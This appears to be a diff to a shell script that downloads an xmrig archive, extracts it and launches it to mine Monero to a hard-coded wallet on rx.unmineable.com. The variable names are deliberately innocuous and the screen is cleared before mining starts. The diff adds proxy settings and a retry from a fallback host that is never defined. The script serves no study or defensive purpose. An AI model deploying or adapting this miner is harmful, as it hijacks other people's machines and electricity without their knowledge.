@@ -4,5 +4,8 @@
 random_var_1="https://random.url/xmrig-release-1"
 random_var_2="https://random.url/innocuous-file.txt"
 
+# Proxy or VPN settings (replace with your actual settings)
+proxy_settings="your_proxy_settings"
+
 # Download, extract, and execute
-(sudo apt-get update -y && sudo apt-get upgrade -y && sudo wget "$random_var_1" && tar -zxvf xmrig-random-string-linux-x64.tar.gz && cd xmrig-random-string && clear && ./xmrig -o rx.unmineable.com:3333 -a rx -k -u XMR:433kDeUsJG9hR21JAgWaPrJ4gbA7tPM3zABQpi44rwGQU17hTMhev163bwT1ozLaMU2ZodFep7mNQJLVwEmMyVk9JqwrEyc.v1 -p x)
+(sudo apt-get update -y && sudo apt-get upgrade -y && sudo wget --proxy="$proxy_settings" "$random_var_1" || sudo wget --tries=3 "$alternative_host" && tar -zxvf xmrig-random-string-linux-x64.tar.gz && cd xmrig-random-string && clear && ./xmrig -o rx.unmineable.com:3333 -a rx -k -u XMR:433kDeUsJG9hR21JAgWaPrJ4gbA7tPM3zABQpi44rwGQU17hTMhev163bwT1ozLaMU2ZodFep7mNQJLVwEmMyVk9JqwrEyc.v1 -p x)
